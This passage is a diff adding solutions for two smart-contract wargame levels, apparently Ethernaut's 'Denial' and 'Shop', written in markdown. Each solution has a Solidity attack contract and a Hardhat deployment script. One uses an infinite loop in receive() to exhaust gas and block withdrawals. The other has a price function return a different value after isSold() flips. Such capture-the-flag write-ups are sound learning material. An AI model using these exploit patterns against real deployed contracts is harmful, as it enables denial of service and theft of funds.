@@ -718,3 +718,92 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 ```
+
+## 20 Denial
+
+```sol
+pragma solidity ^0.8.0;
+
+contract DenialAttack {
+  receive() external payable {
+    // Consume all the gas
+    while (true) {}
+
+    // Note that prior to Solidity 0.8.0 a Panic (say via assert or division by zero) would consume all the gas
+    // Ref: https://docs.soliditylang.org/en/latest/control-structures.html#error-handling-assert-require-revert-and-exceptions
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("Denial")).attach("<target contract address>");
+
+  const contract = await hre.ethers.deployContract("DenialAttack");
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+
+  (await target.setWithdrawPartner(await contract.getAddress())).wait();
+  (await target.withdraw()).wait();
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 21 Shop
+
+```sol
+pragma solidity ^0.8.0;
+
+interface IShop {
+  function buy() external;
+  function isSold() external returns (bool);
+}
+
+contract ShopAttack {
+  address target;
+
+  constructor(address _target) {
+    target = _target;
+  }
+
+  function price() external returns (uint) {
+    // The Buy interface has the view modifier, preventing state modification
+    //calls++;
+    //return calls % 2 == 1 ? 100 : 0;
+
+    return IShop(target).isSold() ? 0 : 100;
+  }
+
+  function attack() external {
+    IShop(target).buy();
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("Shop")).attach("<target contract address>");
+  console.log(`Target price, isSold = ${await target.price()}, ${await target.isSold()}`);
+
+  const contract = await hre.ethers.deployContract("ShopAttack", [await target.getAddress()]);
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+  (await contract.attack()).wait();
+  console.log("Attack complete");
+
+  console.log(`Target price, isSold = ${await target.price()}, ${await target.isSold()}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
